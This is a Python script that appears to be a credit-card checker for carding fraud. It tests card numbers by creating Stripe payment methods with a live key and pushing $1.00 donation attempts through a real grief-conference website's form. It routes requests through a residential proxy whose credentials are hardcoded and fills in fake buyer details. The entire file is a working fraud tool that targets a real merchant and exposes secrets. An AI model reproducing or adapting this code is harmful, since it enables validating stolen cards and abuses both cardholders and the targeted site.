import requests,re
from proxy import reqproxy, make_request
def Tele(cc_data):
	# For proxy IP
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6"
	session, ip = reqproxy(proxy_str)
	print(f"IP Address: {ip}")
	# For own IP
	# url = "https://httpbin.org/get"
	# make_request(url)

	try:        
		cc_data = cc_data.strip().split('|')
		if len(cc_data) != 4:
			raise ValueError(f"Unexpected format for card data: {cc_data}")
        
		n, mm, yy, cvc = map(str.strip, cc_data)
		if yy.startswith("20"):
			yy = yy[2:]

	except ValueError as e:
		print(f"Error processing card: {e}")
		return None  # Exit function in case of error
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51GNVZkCmff2HpFXWPLIJkfTlT6Su7Eq6gWYmMfHkrZQpfruXHDBKHaELfzSnhUQCfrGi1pQBwAGZtRXiv9KarRCj00PW04obKr'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_ga': 'GA1.1.867590447.1744175270',
	    '__stripe_mid': '08136e65-9524-4895-b8df-61816985366e667d09',
	    '__stripe_sid': 'ed2eb0b0-bdf7-4f64-ba2a-f71735a8a055ade7d6',
	    '_ga_GJL9GQNRTP': 'GS1.1.1744602113.4.1.1744602242.0.0.0',
	}
	
	headers = {
	    'authority': 'thehop-e.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.867590447.1744175270; __stripe_mid=08136e65-9524-4895-b8df-61816985366e667d09; __stripe_sid=ed2eb0b0-bdf7-4f64-ba2a-f71735a8a055ade7d6; _ga_GJL9GQNRTP=GS1.1.1744602113.4.1.1744602242.0.0.0',
	    'origin': 'https://thehop-e.com',
	    'referer': 'https://thehop-e.com/breathe-thru-grief-conference/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744602243466',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=6143&_fluentform_7_fluentformnonce=1bb387ebb4&_wp_http_referer=%2Fbreathe-thru-grief-conference%2F&name=Rodam%20User&address%5Baddress_line_1%5D=Street%2027&address%5Bcity%5D=New%20York&address%5Bstate%5D=New%20York&address%5Bzip%5D=10080&phone_number=0817480671&email_address=rodamuser08%40gmail.com&amount=1.00&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '7',
	}
	
	r2 = requests.post('https://thehop-e.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
